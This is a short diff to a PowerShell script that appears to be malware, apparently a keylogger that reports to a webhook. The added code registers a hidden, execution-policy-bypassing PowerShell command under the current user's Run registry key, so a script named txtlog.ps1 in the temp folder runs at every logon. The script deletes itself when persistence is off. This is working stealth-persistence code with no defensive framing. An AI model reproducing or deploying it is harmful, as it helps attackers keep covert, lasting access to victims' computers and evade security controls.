@@ -1,7 +1,9 @@
-
-Write-Output $hook
-Write-Output $RunTime
-Write-Output $TimesRun
+if(($Persistent -eq $true)){
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$hook=' + $hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
+}else{
+    Remove-Item "$env:temp\txtlog.ps1";
+}
 
 Do{
     $getT = Get-Date;
